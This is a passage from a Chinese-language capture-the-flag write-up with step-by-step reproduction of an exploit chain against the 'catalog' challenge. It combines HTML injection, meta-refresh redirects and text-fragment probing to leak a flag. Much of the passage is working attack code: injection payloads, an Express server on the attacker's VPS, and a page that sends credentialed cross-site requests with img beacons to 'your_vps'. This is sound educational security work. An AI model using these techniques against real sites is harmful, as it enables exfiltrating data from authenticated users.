class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-G%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-H%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-I</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x5339;&#x914D;&#x4E86;&#xFF0C;&#x5C31;&#x7EE7;&#x7EED;&#x5728;&#x8FD9;&#x4E2A;&#x8303;&#x56F4;&#x4E8C;&#x5206;&#xFF0C;&#x4E0D;&#x5339;&#x914D;&#x5C31;&#x7528;&#x53E6;&#x4E00;&#x4E2A;&#x8303;&#x56F4;</p><h3 id="Reproduce"><a href="#Reproduce" class="headerlink" title="Reproduce"></a>Reproduce</h3><p>&#x8FD9;&#x4E2A;&#x90E8;&#x5206;&#x5C31;&#x53EA;&#x662F;&#x63D0;&#x4F9B;&#x590D;&#x73B0;&#x7684;&#x6B65;&#x9AA4;&#xFF0C;&#x4E0B;&#x4E2A;&#x90E8;&#x5206;&#x63D0;&#x4F9B;&#x8BE6;&#x7EC6;&#x7684;&#x653B;&#x51FB;&#x94FE;&#x89E3;&#x91CA;&#xFF1A;</p><ol><li><p>&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x8D26;&#x53F7;&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; issue &#xFF0C;&#x5E76;&#x8BB0;&#x5F55;&#x8BE5; issue &#x7684;&#x6570;&#x5B57; id&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x8FA8;&#x8BC6;&#xFF0C;&#x8BE5;&#x6570;&#x5B57; id &#x6211;&#x4EEC;&#x79F0;&#x4E3A; issue_id_1 &#xFF0C;post http &#x5305;&#x7684; body &#x5185;&#x5BB9;&#x4E3A;&#xFF1A;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">id</span>=issue_id_1&amp;title=3&amp;content=1&amp;image=z&quot;/&gt;&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;http://your_vps/fragment&quot;</span>&gt;&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span>+content=&quot;0;URL=&apos;http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%<span class="hljs-attribute">26text</span>=T-,F,{,-0%<span class="hljs-attribute">26text</span>=T-,F,{,-1%<span class="hljs-attribute">26text</span>=T-,F,{,-2%<span class="hljs-attribute">26text</span>=T-,F,{,-3%<span class="hljs-attribute">26text</span>=T-,F,{,-4%<span class="hljs-attribute">26text</span>=T-,F,{,-5%<span class="hljs-attribute">26text</span>=T-,F,{,-6%<span class="hljs-attribute">26text</span>=T-,F,{,-7%<span class="hljs-attribute">26text</span>=T-,F,{,-8%<span class="hljs-attribute">26text</span>=T-,F,{,-9%<span class="hljs-attribute">26text</span>=T-,F,{,-A%<span class="hljs-attribute">26text</span>=T-,F,{,-B%<span class="hljs-attribute">26text</span>=T-,F,{,-D%<span class="hljs-attribute">26text</span>=T-,F,{,-E%<span class="hljs-attribute">26text</span>=T-,F,{,-F%<span class="hljs-attribute">26text</span>=T-,F,{,-G%<span class="hljs-attribute">26text</span>=T-,F,{,-H%<span class="hljs-attribute">26text</span>=T-,F,{,-I%<span class="hljs-attribute">26text</span>=T-,F,{,-J%<span class="hljs-attribute">26text</span>=T-,F,{,-K%<span class="hljs-attribute">26text</span>=T-,F,{,-L%<span class="hljs-attribute">26text</span>=T-,F,{,-M%<span class="hljs-attribute">26text</span>=T-,F,{,-N%<span class="hljs-attribute">26text</span>=T-,F,{,-O%<span class="hljs-attribute">26text</span>=T-,F,{,-P%<span class="hljs-attribute">26text</span>=T-,F,{,-Q%<span class="hljs-attribute">26text</span>=T-,F,{,-R%<span class="hljs-attribute">26text</span>=T-,F,{,-S%<span class="hljs-attribute">26text</span>=T-,F,{,-T%<span class="hljs-attribute">26text</span>=T-,F,{,-U%<span class="hljs-attribute">26text</span>=T-,F,{,-V%<span class="hljs-attribute">26text</span>=T-,F,{,-W%<span class="hljs-attribute">26text</span>=T-,F,{,-X%<span class="hljs-attribute">26text</span>=T-,F,{,-Y%<span class="hljs-attribute">26text</span>=T-,F,{,-Z%<span class="hljs-attribute">26text</span>=T-,F,{,-_<span class="hljs-string">&apos;&quot;&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x518D;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; issue &#xFF0C; &#x5E76;&#x8BB0;&#x5F55;&#x8BE5; issue &#x7684;&#x6570;&#x5B57; id&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x8FA8;&#x8BC6;&#xFF0C;&#x8BE5;&#x6570;&#x5B57; id &#x6211;&#x4EEC;&#x79F0;&#x4E3A; issue_id_2&#xFF0C;post http &#x5305;&#x7684; body &#x5185;&#x5BB9;&#x4E3A;&#xFF1A;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">id</span>=issue_id_2&amp;title=3&amp;content=1&amp;image=&quot;&gt;&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://your_vps/&apos;&quot;</span>&gt;&quot;</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x81EA;&#x5DF1;&#x7684; vps &#x4E0A;&#x7528; node &#x8FD0;&#x884C;&#x5982;&#x4E0B; exp.js</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> status = <span class="hljs-literal">false</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> unlock = <span class="hljs-literal">false</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> match = <span class="hljs-literal">false</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/status&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    res.send(<span class="hljs-string">`<span class="hljs-subst">${status}</span>`</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/unlock&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    unlock = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;unlock&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/firstload&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin opened challenge&apos;s page&quot;</span>);</span><br><span class="line">    res.send(<span class="hljs-string">&quot;firstload&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin was redirected to attacker&apos;s page&quot;</span>);</span><br><span class="line">    res.sendFile(<span class="hljs-string">&quot;index.html&quot;</span>, {</span><br><span class="line">        root: __dirname</span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/injection&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; HTML injection was inserted into id=3 catalog&quot;</span>);</span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> (match) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There was a match&quot;</span>);</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There wasn&apos;t a match&quot;</span>);</span><br><span class="line">        match = <span class="hljs-literal">false</span>;</span><br><span class="line">        unlock = <span class="hljs-literal">false</span>;</span><br><span class="line">        status = <span class="hljs-literal">false</span>;</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">    res.send(<span class="hljs-string">&quot;injection&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/exfiltrated&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    match = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;exfiltrated&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/fragment&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    status = <span class="hljs-literal">true</span>;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin was fragmented&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">let</span> timer = setInterval(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> (unlock) {</span><br><span class="line">            res.send(<span class="hljs-string">&quot;fragment&quot;</span>);</span><br><span class="line">            clearInterval(timer);</span><br><span class="line">        }</span><br><span class="line">    }, <span class="hljs-number">1</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.listen(port);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Server running on port: &quot;</span> + port);</span><br></pre></td></tr></tbody></table></figure><p></p><p>index.html:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Psst! Get out of here...<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">const</span> next = <span class="hljs-keyword">async</span> () =&gt; {</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> res  = <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;/status&quot;</span>);</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> status = <span class="hljs-keyword">await</span> res.text();</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-keyword">if</span> (status === <span class="hljs-string">&quot;true&quot;</span>) {</span></span><br><span class="line"><span class="hljs-javascript">                    <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;http://catalog.pwni.ng/user.php&quot;</span>, {</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;headers&quot;</span>: {</span></span><br><span class="line"><span class="hljs-actionscript">                            <span class="hljs-string">&quot;content-type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,</span></span><br><span class="line">                        },</span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">                        &quot;body&quot;: `username=&quot;/&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://your_vps/injection&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;left&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://your_vps/exfiltrated&quot;</span> <span class="hljs-attr">loading</span>=<span class="hljs-string">&quot;lazy&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>&amp;password=1&amp;action=login`,</span></span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;mode&quot;</span>: <span class="hljs-string">&quot;no-cors&quot;</span>,</span></span><br><span class="line"><span class="hljs-actionscript">                        <span class="hljs-string">&quot;credentials&quot;</span>: <span class="hljs-string">&quot;include&quot;</span></span></span><br><span class="line">                    });</span><br><span class="line"><span class="hljs-javascript">                    <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&quot;/unlock&quot;</span>);</span></span><br><span class="line"><span class="hljs-actionscript">                } <span class="hljs-keyword">else</span> {</span></span><br><span class="line">                    next();</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            next();</span><br><span class="line">        <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://catalog.pwni.ng/issue.php?id=issue_id_1&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute; width: 400%; height: 500px; border: 0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4E2D;<code>your_vps</code>&#x5904;&#x66FF;&#x6362;&#x4E3A;&#x4F60;&#x7684; vps &#x5730;&#x5740;&#xFF0C;issue_id_1 &#x66FF;&#x6362;&#x4E3A;&#x4E4B;&#x524D;&#x7684;&#x6570;&#x5B57; id</p></li><li><p>&#x968F;&#x4FBF; report &#x4E00;&#x4E2A; issue &#x7ED9; admin &#x5E76;&#x6293;&#x5305;&#x4FEE;&#x6539;&#x5185;&#x5BB9;&#xFF0C;&#x628A; id &#x5B57;&#x6BB5;&#x6539;&#x6210; issue_id_2 &#x5373;&#x53EF;&#x3002;</p><p></p><figure class="highlight ini hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">id</span>=<span class="hljs-number">19902</span>&amp;token=<span class="hljs-number">03</span>AGdBq26Abe5GL1dxt9c1N1n03hjoiUv1KCzn6o6VII3LGYY2JBKZLrVU5I7KxViJW8X87Nt_PJOFxyHpIFq_wq0Xph-SyP5dQTvu-s5k3AePCPKo8lMurhTM1V1Af_RdPImnBoGZb6Nm6YcilLNLeHLbGbDj7XPFCHqjdSq1zyJA7Luam8SlPzgPJOOPJYz65fXRPtn0GVunipJNjiXbXtvPKTJjPVat784uRrCQ47aHuWXnxyipstDGkZj0-iujm9k-L51EUDv9FbW4kEULU0_nDwVgtIc5ZniVcIVgupcpfGAagCLMyKGfDsFho9U4BHsdqsc7918PN<span class="hljs-literal">yeS</span>rcbPN7gmq_aLJRTGx6bICHnzHzaKNB5yakec0YsC1CQzLhtqqZhTQvEJNREkXvBHZ7PlYXdypNCNSCwI_g</span><br></pre></td></tr></tbody></table></figure><p></p><p>token &#x662F; Google &#x9A8C;&#x8BC1;&#x7801;&#x7528;&#x4E8E;&#x9A8C;&#x8BC1;&#x7684; token &#xFF0C;&#x8FD9;&#x4E2A; token &#x4F60;&#x53EF;&#x4EE5;&#x53E6;&#x5F00;&#x4E00;&#x4E2A;&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6253;&#x5F00;&#x63A7;&#x5236;&#x53F0;&#x8F93;&#x5165;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#xFF08;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x5728;&#x9898;&#x76EE; main.js &#x62FF;&#x5230;&#xFF09;&#x5373;&#x53EF;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grecaptcha.ready(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">    <span class="hljs-keyword">let</span> token = <span class="hljs-keyword">await</span> grecaptcha.execute(<span class="hljs-string">&quot;6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y&quot;</span>, {</span><br><span class="line">        action: <span class="hljs-string">&quot;report&quot;</span></span><br><span class="line">    });</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(token);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x5982;&#x679C; vps &#x6536;&#x5230;&#x4E86; match &#xFF0C;&#x5C31;&#x5728;&#x8BE5;&#x8303;&#x56F4;&#x7EE7;&#x7EED;&#x4E8C;&#x5206;&#xFF0C;&#x4E0D;&#x7136;&#x5C31;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x8303;&#x56F4;&#x7EE7;&#x7EED;&#x4E8C;&#x5206;&#xFF0C;&#x91CD;&#x590D;1-4&#x6B65;&#x9AA4;&#x5373;&#x53EF;</p></li></ol><h3 id="Detailed-Attack-Chain"><a href="#Detailed-Attack-Chain" class="headerlink" title="Detailed Attack Chain"></a>Detailed Attack Chain</h3><p>&#x597D;&#x4E86;&#xFF0C;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5C31;&#x6765;&#x6574;&#x7406;&#x4E00;&#x4E0B;&#x5168;&#x90E8;&#x4FE1;&#x606F;&#xFF0C;&#x4EE5;&#x53CA;&#x8BF4;&#x4E00;&#x4E0B;&#x8BE6;&#x7EC6;&#x7684;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#xFF1A;</p><ol><li><p>&#x9996;&#x5148; admin &#x4F1A;&#x70B9;&#x51FB;&#x6211;&#x4EEC;&#x63D0;&#x4EA4;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A; issue &#xFF0C;&#x7136;&#x540E;&#x56E0;&#x4E3A;&#x7B2C;&#x4E8C;&#x4E2A; issue_2 &#x5185;&#x5BB9;&#x5B58;&#x5728;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://your_vps/&apos;&quot;</span>&gt;</span>&quot;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F1A;&#x8DF3;&#x8F6C;&#x5230;&#x6211;&#x4EEC; vps &#x4E3B;&#x9875;&#x9762;</p></li><li><p>&#x8FD9;&#x65F6; admin &#x4F1A;&#x52A0;&#x8F7D; index.html &#xFF0C;&#x6B64;&#x65F6; iframe &#x4F1A;&#x8BF7;&#x6C42;&#x7B2C;&#x4E00;&#x4E2A; issue_1 &#x9875;&#x9762;&#xFF0C;&#x5E76;&#x4E14;&#x53D1;&#x9001;&#x8BF7;&#x6C42; <a href="http://your_vps/status" target="_blank" rel="noopener">http://your_vps/status</a> &#xFF0C;&#x6700;&#x521D;&#x59CB;&#x5316;&#x7684;&#x65F6;&#x5019;&#x56E0;&#x4E3A;<code>let status = false;</code>&#xFF0C;&#x800C; js &#x8FD8;&#x6709;&#x4E00;&#x4E2A; status &#x7684;&#x5224;&#x65AD;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> status = <span class="hljs-keyword">await</span> res.text();</span><br><span class="line"><span class="hljs-keyword">if</span> (status === <span class="hljs-string">&quot;true&quot;</span>) {</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5; script &#x91CC;&#x9762;&#x7684;&#x6D41;&#x7A0B;&#x4F1A;&#x4E00;&#x76F4;&#x7B49;&#x5F85;<code>status</code>&#x7684;&#x53D8;&#x5316;&#xFF0C;&#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x7C7B;&#x4F3C;&#x4E8E;&#x9501;&#x4E00;&#x6837;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x5C31;&#x79F0;&#x4E3A; status &#x9501;&#xFF0C;&#x800C;&#x89E3;&#x9501;&#x8FD9;&#x4E2A;&#x9501;&#x7684;&#x6761;&#x4EF6;&#x5C31;&#x662F;&#x5F53; iframe &#x91CC;&#x9762;&#x7684; issue_1 &#x5B8C;&#x5168;&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#x3002;</p><p>&#x5F53; iframe &#x4E2D;&#x7684; issue_1 